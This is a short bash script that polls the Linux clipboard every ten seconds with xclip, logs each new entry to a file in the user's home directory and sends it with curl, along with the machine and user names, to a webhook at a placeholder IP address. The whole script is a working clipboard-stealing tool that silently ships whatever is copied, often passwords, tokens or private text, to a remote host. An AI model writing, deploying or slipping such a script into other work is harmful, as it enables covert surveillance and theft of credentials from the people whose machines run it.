#!/bin/bash

# URL of the webhook
webhook_url="http://<IP>:5000/clipboard_receiver"

# Log file location
log_file="/home/$USER/clipboard_log.txt"

# Last clipboard content (to avoid sending same data repeatedly)
last_clip_text=""

while true; do
    # Get clipboard content (you can choose xclip or xsel)
    clip_text=$(xclip -o -selection clipboard)

    # Check if clipboard content exists and if it's different from the last one
    if [[ -n "$clip_text" && "$clip_text" != "$last_clip_text" ]]; then
        # Log the clipboard content to a file
        echo "Clipboard: $clip_text" >> "$log_file"

        # Create the POST data as form parameters (not JSON)
        post_data="clipboard_data=$clip_text&machine_name=$HOSTNAME&user_name=$USER"

        # Send the clipboard content to the webhook
        curl -s -X POST -d "$post_data" "$webhook_url"

        # Update the last clipboard content
        last_clip_text="$clip_text"
    fi

    # Sleep for 10 seconds before checking the clipboard again
    sleep 10
done
